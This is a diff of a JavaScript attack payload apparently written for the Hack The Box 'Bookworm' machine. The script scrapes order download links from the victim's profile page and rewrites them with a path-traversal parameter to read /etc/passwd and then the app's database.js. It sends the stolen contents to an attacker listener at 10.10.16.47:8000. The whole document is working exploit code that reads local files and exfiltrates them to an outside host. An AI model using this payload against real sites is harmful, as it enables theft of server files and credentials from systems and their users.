@@ -23,13 +23,13 @@ function get_orders(html_page){
   
     // Extract the download URL
     // const downloadURL = downloadLink ? downloadLink.href : null;
-    const downloadURL = downloadLink ? downloadLink.href.substring(0, downloadLink.href.lastIndexOf("=") + 1) + ".&bookIds=../../../../../../../../etc/passwd" : null;
+    const downloadURL = downloadLink ? downloadLink.href.substring(0, downloadLink.href.lastIndexOf("=") + 1) + ".&bookIds=../../../../../../../../proc/self/cwd/database.js" : null;
   
     return downloadURL;
   }
   
   function fetch_url_to_attacker(url){
-    var attacker = "http://10.10.16.47/?url=" + encodeURIComponent(url);
+    var attacker = "http://10.10.16.47:8000/?url=" + encodeURIComponent(url);
   
     fetch(url).then(
       async response=>{
@@ -45,7 +45,7 @@ function get_orders(html_page){
       })
   }
   
-  fetch("http://10.10.16.47/?trying")
+  fetch("http://10.10.16.47:8000/?trying")
   fetch("http://bookworm.htb/profile").then(
     async response=>{
       for (const path of get_orders(await response.text())){
